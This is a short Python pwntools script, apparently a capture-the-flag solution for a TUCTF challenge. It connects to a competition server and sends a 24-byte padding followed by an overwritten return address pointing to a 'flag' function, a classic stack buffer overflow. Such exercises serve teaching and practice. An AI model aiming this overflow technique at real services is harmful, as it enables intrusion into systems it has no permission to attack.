
from pwn import *

flag = 0x080491F6

r = remote('chal.tuctf.com', 30508)

p = b'A' * 24 + p64(flag)

r.recvuntil('> ')
r.sendline(p)

print(r.recvall().decode('utf-8'))
